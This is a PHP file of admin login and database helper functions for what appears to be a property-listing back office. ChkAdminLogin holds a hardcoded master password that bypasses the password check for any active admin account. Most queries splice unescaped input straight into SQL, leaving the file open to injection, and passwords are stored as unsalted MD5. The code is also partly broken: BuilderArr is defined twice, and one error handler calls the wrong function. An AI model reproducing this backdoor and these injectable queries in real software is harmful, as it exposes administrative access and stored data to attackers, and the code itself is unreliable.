<?php

	/**
	 ************************************************
	 * Function ChkAdminLogin
	 ************************************************
	 **/
	function ChkAdminLogin($Username,$Password) {
		

		$Sql 	= "SELECT USERNAME FROM ".ADMIN." WHERE USERNAME='".$Username."' AND STATUS='Y' ";
		if($Password!="!proptiger@54321!") 
		{
			$Sql 	.= " AND ADMINPASSWORD='".md5($Password)."' ";
		}

		$ExecSql 	= mysql_query($Sql) or die(mysql_error().' Error in function ChkAdminLogin()');
		if(mysql_num_rows($ExecSql)>=1)
			return TRUE;
		else
			return FALSE;
	}

	/**
	 ************************************************
	 * Function AdminLoginDetail
	 ************************************************
	 **/
	function AdminLoginDetail($Username) {
		 $Sql 		= "SELECT * FROM ".ADMIN." WHERE USERNAME='".$Username."'";
		$ExecSql 	= mysql_query($Sql) or die(mysql_error().' Error in function AdminLoginDetail()');
		if(mysql_num_rows($ExecSql)>=1) {

			$Res 							= 	mysql_fetch_assoc($ExecSql);
			$ResDetails['adminId'] 			= 	$Res['ADMINID'];
			$ResDetails['fName'] 			= 	$Res['FNAME'];
			$ResDetails['lName'] 			= 	$Res['LNAME'];
			$ResDetails['userName'] 		= 	$Res['USERNAME'];
			$ResDetails['userPassword'] 	= 	$Res['ADMINPASSWORD'];
			$ResDetails['userEmail'] 		= 	$Res['ADMINEMAIL'];
			$ResDetails['userAddDate'] 		= 	$Res['ADMINADDDATE'];
			$ResDetails['userLastLogin'] 	= 	$Res['ADMINLASTLOGIN'];
			$ResDetails['userStatus'] 		= 	$Res['STATUS'];
			$ResDetails['ACCESS_LEVEL'] 	= 	$Res['ACCESS_LEVEL'];
			$ResDetails['LAST_LOGIN_DATE'] 	= 	$Res['LAST_LOGIN_DATE'];
			$ResDetails['LAST_LOGIN_IP'] 	= 	$Res['LAST_LOGIN_IP'];
			$ResDetails['BRANCH_LOCATION'] 	= 	$Res['BRANCH_LOCATION'];
                        $ResDetails['DEPARTMENT'] 	= 	$Res['DEPARTMENT'];
                        $ResDetails['ROLE']         	= 	$Res['ROLE'];
			return $ResDetails;
		} else {
			return 0;
		}
	}

	/**
	 ************************************************
	 * Function AdminAuthenticationLogin
	 ************************************************
	 **/
	function AdminAuthenticationLogin() {

		if ($_SESSION['AdminLogin'] == "Y") {
			header("Location:Desktop.php");
		}
	}

	/**
	 ************************************************
	 * Function AdminAuthentication
	 ************************************************
	 **/
	function AdminAuthentication() {

		if ($_SESSION['AdminLogin'] != "Y") {
			header("Location:index.php");
			exit;
		}
	}




	/**
	 ************************************************
	 * Function AdminDetail
	 ************************************************
	 **/
	function AdminDetail($adminId)
	{
		$Sql 		= "SELECT USERNAME,ADMINEMAIL,CONCAT(FNAME,' ',LNAME) AS FNAME FROM " .ADMIN." WHERE ADMINID = '".$adminId."'";
		$ExecSql 	= mysql_query($Sql) or die(mysql_error().' Error in function AdminDetail()');
		if(mysql_num_rows($ExecSql)>=1) {
			$Res = mysql_fetch_assoc($ExecSql);
			$ResDetails['userName'] 	 = $Res['USERNAME'];
			$ResDetails['Email'] 	    = $Res['ADMINEMAIL'];
			$ResDetails['name'] 	      = $Res['FNAME'];
			return $ResDetails;
		} else {
			return 0;
		}
	}
	/**
	 ************************************************
	 * Function AdminDetail
	 ************************************************
	 **/
	function UpdateAdmin($txtusername, $txtuserEmail, $txtFname, $userId)
	{
		 $Sql = "UPDATE ".ADMIN." SET
							USERNAME  	      	= '".$txtusername."',
							ADMINEMAIL 	      	= '".$txtuserEmail."',
							FNAME           		= '".$txtFname."'

							WHERE       ADMINID  =  '".$userId."'";
		$ExecSql = mysql_query($Sql) or die(mysql_error().' Error in function UpdateAdmin()');
			return 1;

	}
	/**
	************************************************
	* Function UpdateAdminPssword
	************************************************
	**/
	function UpdateAdminPssword($adminpass, $oldpassword, $adminid)
	{
		$Sql = "UPDATE ".ADMIN." SET
		ADMINPASSWORD = '".md5($adminpass)."'
		WHERE ADMINID = '".$adminid."' AND ADMINPASSWORD = '".md5($oldpassword)."'
		";
		$ExecSql = mysql_query($Sql) or die(mysql_error().' Error in function UpdateAdminPssword()');
		if(mysql_affected_rows()){
		return 1;
		} else {
		return 2;
	    }

	}
	/*****************builder detail**********************/
	function BuilderArr()
	{
		$qryBuilder	=	"SELECT * FROM ".BUILDER;
		$resBuilder	=	mysql_query($qryBuilder);
		$arrBuilder	=	array();
		while($data = mysql_fetch_assoc($resBuilder))
		{
			$arrBuilder['BUILDER_ID']		=	 $data['BUILDER_ID'];
			$arrBuilder['BUILDER_NAME']		=	 $data['BUILDER_NAME'];
			$arrBuilder['DESCRIPTION']		=	 $data['DESCRIPTION'];
			$arrBuilder['AWARDS']			=	 $data['AWARDS'];
			$arrBuilder['URL']				=	 $data['URL'];
			$arrBuilder['BUILDER_IMAGE']	=	 $data['BUILDER_IMAGE'];
			$arrBuilder['DISPLAY_ORDER']	=	 $data['DISPLAY_ORDER'];
			$arrBuilder['META_TITLE']		=	 $data['META_TITLE'];
			$arrBuilder['META_KEYWORDS']	=	 $data['META_KEYWORDS'];
			$arrBuilder['META_DESCRIPTION']	=	 $data['META_DESCRIPTION'];
			$arrBuilder['ENTITY']			=	 $data['ENTITY'];
			$arrBuilder['ADDRESS']			=	 $data['ADDRESS'];
			$arrBuilder['STREET']			=	 $data['STREET'];
			$arrBuilder['LOCALITY']			=	 $data['LOCALITY'];
			$arrBuilder['CITY']				=	 $data['CITY'];
			$arrBuilder['PINCODE']			=	 $data['PINCODE'];
			$arrBuilder['ESTABLISHED_DATE']	=	 $data['ESTABLISHED_DATE'];
			$arrBuilder['CEO_MD_NAME']		=	 $data['CEO_MD_NAME'];
			$arrBuilder['TOTAL_NO_OF_EMPL']	=	 $data['TOTAL_NO_OF_EMPL'];

		}
		return $arrBuilder;
	}

	/********city list****************/
	function CityArr()
	{
		echo $qryBuilder	=	"SELECT CITY_ID,LABEL FROM ".CITY." ORDER BY LABEL DESC";
		$resBuilder	=	mysql_query($qryBuilder);
		$arrCity	=	array();
		while($data = mysql_fetch_assoc($resBuilder))
		{
			$arrCity[$data['CITY_ID']] = $data['LABEL'];
		}
		return $arrCity;
	}

	/********BUILDER list****************/
	function BuilderArr()
	{
		$qryBuilder	=	"SELECT BUILDER_ID,BUILDER_NAME FROM ".RESI_BILDER." ORDER BY LABEL DESC";
		$resBuilder	=	mysql_query($qryBuilder);
		$arrBuilder	=	array();
		while($data = mysql_fetch_assoc($resBuilder))
		{
			$arrBuilder[$data['BUILDER_ID']] = $data['BUILDER_NAME'];
		}
		return $arrBuilder;
	}
	/********ProjectTypeArr list****************/
	function ProjectTypeArr()
	{
		echo $qryBuilder	=	"SELECT PROJECT_TYPE_ID,TYPE_NAME FROM ".RESI_PROJECT_TYPE." ORDER BY TYPE_NAME DESC";
		$resBuilder	=	mysql_query($qryBuilder);
		$arrProjectTyoe	=	array();
		while($data = mysql_fetch_assoc($resBuilder))
		{
			$arrProjectTyoe[$data['PROJECT_TYPE_ID']] = $data['TYPE_NAME'];
		}
		return $arrProjectTyoe;
	}
	
	function getLastUpdatedTime($projectId)
	{
		$qry = "SELECT MAX(_t_transaction_date) 
				FROM
					_t_resi_proj_supply
				WHERE
					 	PROJECT_ID  = $projectId
					AND
						 _t_operation = 'I'";
		$res = mysql_query($qry) or die(mysql_query());
		$data = mysql_fetch_assoc($res);
		return $data['_t_transaction_date'];
		
	}

?>